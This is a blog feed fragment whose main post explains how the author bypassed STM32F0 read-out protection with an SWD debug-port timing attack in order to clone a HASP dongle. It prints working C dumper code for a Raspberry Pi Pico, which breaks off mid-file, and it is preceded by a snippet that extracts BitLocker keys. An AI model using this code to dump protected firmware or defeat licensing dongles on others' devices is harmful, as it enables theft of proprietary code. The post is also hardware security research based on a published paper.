            <span class="bp">self</span><span class="p">.</span><span class="n">report_bitlocker_key</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">fifoStart</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoEnd</span><span class="p">,</span> <span class="n">key</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">fifoData</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>

    <span class="k">def</span> <span class="nf">putfifo</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">ttype</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">!=</span> <span class="n">ttype</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">endfifo</span><span class="p">()</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">fifoType</span> <span class="o">=</span> <span class="n">ttype</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">fifoStart</span> <span class="o">=</span> <span class="n">start</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">fifoEnd</span> <span class="o">=</span> <span class="n">end</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">fifoData</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>]]></content><author><name>Lucas Teske</name></author><category term="Reverse Engineering" /><category term="Satellite" /><category term="SDR" /><category term="Flash" /><category term="PAX" /><category term="Hardware Hacking" /><category term="RE" /><category term="Reverse Engineering" /><category term="NAND" /><category term="PAX" /><category term="RT809H" /><summary type="html"><![CDATA[The TPM 2.0, also known as Trusted Platform Module 2.0, is a hardware security feature embedded in many modern computers. Its purpose is to provide a secure way to store cryptographic keys and other sensitive data, such as passwords and digital certificates, aiming to protect against various security threats, including unauthorized access to a computer’s hardware and software. TPM 2.0 represents an evolution of the original TPM specification, developed by the Trusted Computing Group (TCG), and features additional capabilities and resources, such as support for additional cryptographic algorithms and the ability to store larger amounts of data.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" /><media:content medium="image" url="https://lucasteske.dev/assets/gepeto/tpm2.0.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">STM32F0x Protected Firmware Dumper</title><link href="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper" rel="alternate" type="text/html" title="STM32F0x Protected Firmware Dumper" /><published>2024-01-16T02:23:00-03:00</published><updated>2024-01-16T02:23:00-03:00</updated><id>https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper</id><content type="html" xml:base="https://lucasteske.dev/2024/01/stm32f0x-protected-firmware-dumper"><![CDATA[<p>In the process of my hobby hardware hacking, I encountered a Chinese clone of a HASP HL dongle equipped with a STM32F042G6U6 processor. My intention was to clone it, and during my exploration, I discovered four pins from the SWD debug interface located at the bottom of the PCB. I soldered a 4-pin header to these pins for ease of access.</p>

<p>Utilizing my Segger J-Link as a debug probe, although any JTAG adapter should suffice, I paired it with OpenOCD. Given that the chipset is recognized by OpenOCD, I crafted a script to extract all possible data, conditional upon enablement.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adapter driver jlink
transport select swd
adapter_khz 4000
source [find target/stm32f0x.cfg]
init
dap info
reset halt
flash read_bank 0 firmwareF1.bin 0 0x8000
reset
shutdown
</code></pre></div></div>

<p>But, hit a snag - the device’s RDP (Read-Out Protection) was on, even though SWD was active. No biggie, I thought, and tried to bypass this with voltage fault injection. However, the internal clock generator in the device made clock glitching a no-go. After a few hours of getting nowhere, it was clear I needed a new game plan.</p>

<p>My search for alternatives led me to a comprehensive paper detailing three methodologies to extract protected memory:</p>

<p><a href="https://www.aisec.fraunhofer.de/en/FirmwareProtection.html">https://www.aisec.fraunhofer.de/en/FirmwareProtection.html</a></p>

<p>I gave the Cold Boot Method a shot, but no dice - probably because I couldn’t tinker with the device’s clock, and that’s pretty much a deal-breaker for it to work. The UVC method? Too risky, and I wasn’t about to wreck the dongle. So, that left me with SWD Debug Port glitching.</p>

<p>Now, there was a PoC for this glitch, and it had some good info, but it was all about STM32 code with a bunch of device-specific stuff. I needed something more universal. After combing through the PoC and the paper, I mixed in some of my own sauce and crafted a new code.</p>

<p>For the testing ground, I hooked up a Raspberry Pi Pico with <a href="http://platform.io/">platform.io</a>. I had to go direct with the SWD protocol since standard debug probes like my J-Link were too nosy with device initialization. This glitch needed a quick draw on the flash read, and every millisecond counted.</p>

<p>Here’s the kicker - the code’s protection only kicks in when you try to touch the flash memory with debug mode on. But if you’re quick on the draw, you can snag a DWORD from the flash before the doors slam shut.</p>

<p>To pull the whole firmware, it’s a dance with the reset pin and the device’s power supply. You’ve got to power cycle to reset the debug mode flag. Here’s the play-by-play:</p>

<ol>
  <li>Hit the reset pin</li>
  <li>Juice up the device</li>
  <li>Release the reset pin</li>
  <li>Make the read</li>
  <li>Cut the power</li>
  <li>Run it back</li>
</ol>

<p>The Raspberry Pi Pico was all I needed to power the device since the STM32 doesn’t pull much juice. If you’re dealing with something thirstier, a transistor or relay to flip the power might be the way to go. You can check out the whole operation and the code over at <a href="https://github.com/racerxdl/stm32f0-pico-dump">https://github.com/racerxdl/stm32f0-pico-dump</a> or available below.</p>

<p><img src="/assets/posts/patreon/Pasted image 20230124035820.png" alt="Working dump of bytes" />
<em>An image showcasing streams of DWORD data from the STM32F0 firmware being transmitted in real-time via the Raspberry Pi Pico’s serial port, illuminating the terminal with lines of extracted code.</em></p>

<h2 id="code">Code</h2>

<h3 id="halc">hal.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>
<span class="kt">void</span> <span class="nf">targetInit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">targetPowerOff</span><span class="p">();</span>
    <span class="n">targetReset</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetRestore</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_RESET_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetPowerOff</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">targetPowerOn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">TARGET_PWR_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="readerc">reader.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
#include</span> <span class="cpf">"swd.h"</span><span class="cp">
</span>
<span class="cm">/* Reads one 32-bit word from read-protection Flash memory. Address must be 32-bit aligned */</span>
<span class="n">swdStatus_t</span> <span class="nf">extractFlashData</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">address</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">swdStatus_t</span> <span class="n">dbgStatus</span><span class="p">;</span>

    <span class="cm">/* Add some jitter on the moment of attack (may increase attack effectiveness) */</span>
    <span class="k">static</span> <span class="kt">uint16_t</span> <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>

    <span class="kt">uint32_t</span> <span class="n">extractedData</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">idCode</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* Limit the maximum number of attempts PER WORD */</span>
    <span class="kt">uint32_t</span> <span class="n">numReadAttempts</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="cm">/* try up to MAX_READ_TRIES times until we have the data */</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>

        <span class="n">targetPowerOn</span><span class="p">();</span>

        <span class="n">delay</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>

        <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdInit</span><span class="p">(</span><span class="o">&amp;</span><span class="n">idCode</span><span class="p">);</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdEnableDebugIF</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSetAP32BitMode</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdSelectAHBAP</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">targetRestore</span><span class="p">();</span>
            <span class="n">delay</span><span class="p">(</span><span class="n">delayJitter</span><span class="p">);</span>

            <span class="cm">/* The magic happens here! */</span>
            <span class="n">dbgStatus</span> <span class="o">=</span> <span class="n">swdReadAHBAddr</span><span class="p">((</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFCu</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">extractedData</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">targetReset</span><span class="p">();</span>

        <span class="cm">/* Check whether readout was successful. Only if swdStatusOK is returned, extractedData is valid */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">dbgStatus</span> <span class="o">==</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">extractedData</span><span class="p">;</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">LED1_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="o">++</span><span class="n">numReadAttempts</span><span class="p">;</span>

            <span class="n">delayJitter</span> <span class="o">+=</span> <span class="n">DELAY_JITTER_MS_INCREMENT</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">delayJitter</span> <span class="o">&gt;=</span> <span class="n">DELAY_JITTER_MS_MAX</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">delayJitter</span> <span class="o">=</span> <span class="n">DELAY_JITTER_MS_MIN</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="n">targetPowerOff</span><span class="p">();</span>

        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="n">targetRestore</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
        <span class="n">targetReset</span><span class="p">();</span>
        <span class="n">delay</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="p">}</span> <span class="k">while</span> <span class="p">((</span><span class="n">dbgStatus</span> <span class="o">!=</span> <span class="n">swdStatusOk</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">numReadAttempts</span> <span class="o">&lt;</span> <span class="p">(</span><span class="n">MAX_READ_ATTEMPTS</span><span class="p">)));</span>

    <span class="k">return</span> <span class="n">dbgStatus</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h3 id="swdc">swd.c</h3>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
 * Copyright (C) 2017 Obermaier Johannes
 * Copyright (C) 2022 Lucas Teske
 *
 * This Source Code Form is subject to the terms of the MIT License.
 * If a copy of the MIT License was not distributed with this file,
 * you can obtain one at https://opensource.org/licenses/MIT
 */</span>

<span class="cp">#include</span> <span class="cpf">"swd.h"</span><span class="cp">
</span>
<span class="cp">#include</span> <span class="cpf">"main.h"</span><span class="cp">
</span>
<span class="cp">#define MWAIT __asm__ __volatile__( \
    ".syntax unified 		\n"          \
    "	movs r0, #0x20 		\n"          \
    "1: 	subs r0, #1 		\n"          \
    "	bne 1b 			\n"                 \
    ".syntax divided"               \
    :                               \
    :                               \
    : "cc", "r0")
</span>
<span class="cp">#define N_READ_TURN (3u)
</span>
<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">);</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadPacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdWritePacket</span><span class="p">(</span><span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>
<span class="k">static</span> <span class="n">swdStatus_t</span> <span class="nf">swdReadAP0</span><span class="p">(</span><span class="kt">uint32_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">);</span>

<span class="k">static</span> <span class="kt">uint8_t</span> <span class="nf">swdParity</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">par</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">par</span> <span class="o">^=</span> <span class="p">(</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">);</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">par</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDatasend</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="k">const</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
            <span class="o">++</span><span class="n">data</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span> <span class="p">((</span><span class="n">cdata</span> <span class="o">&amp;</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x01u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">MWAIT</span><span class="p">;</span>

        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataIdle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">INPUT</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataPP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">pinMode</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">OUTPUT</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdTurnaround</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdDataRead</span><span class="p">(</span><span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">data</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>

    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">swdDataIdle</span><span class="p">();</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">cdata</span> <span class="o">&gt;&gt;=</span> <span class="mi">1u</span><span class="p">;</span>
        <span class="n">cdata</span> <span class="o">|=</span> <span class="n">digitalRead</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">)</span> <span class="o">?</span> <span class="mh">0x80u</span> <span class="o">:</span> <span class="mh">0x00u</span><span class="p">;</span>
        <span class="n">data</span><span class="p">[(((</span><span class="n">len</span> <span class="o">+</span> <span class="mi">7u</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">3u</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1u</span><span class="p">]</span> <span class="o">=</span> <span class="n">cdata</span><span class="p">;</span>

        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>

        <span class="cm">/* clear buffer after reading 8 bytes */</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x07u</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cdata</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdReset</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">uint8_t</span> <span class="n">i</span><span class="p">;</span>

    <span class="n">MWAIT</span><span class="p">;</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
    <span class="n">MWAIT</span><span class="p">;</span>

    <span class="cm">/* 50 clk+x */</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">50u</span> <span class="o">+</span> <span class="mi">10u</span><span class="p">);</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWDIO_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3u</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">HIGH</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
        <span class="n">digitalWrite</span><span class="p">(</span><span class="n">SWCLK_Pin</span><span class="p">,</span> <span class="n">LOW</span><span class="p">);</span>
        <span class="n">MWAIT</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">swdBuildHeader</span><span class="p">(</span><span class="n">swdAccessDirection_t</span> <span class="k">const</span> <span class="n">adir</span><span class="p">,</span> <span class="n">swdPortSelect_t</span> <span class="k">const</span> <span class="n">portSel</span><span class="p">,</span> <span class="kt">uint8_t</span> <span class="k">const</span> <span class="n">A32</span><span class="p">,</span> <span class="kt">uint8_t</span><span class="o">*</span> <span class="k">const</span> <span class="n">header</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">portSel</span> <span class="o">==</span> <span class="n">swdPortSelectAP</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x02u</span><span class="p">;</span> <span class="cm">/* Access AP */</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">adir</span> <span class="o">==</span> <span class="n">swdAccessDirectionRead</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x04u</span><span class="p">;</span> <span class="cm">/* read access */</span>
    <span class="p">}</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">A32</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">case</span> <span class="mh">0x01u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x08u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

        <span class="k">case</span> <span class="mh">0x02u</span><span class="p">:</span>
            <span class="o">*</span><span class="n">header</span> <span class="o">|=</span> <span class="mh">0x10u</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>

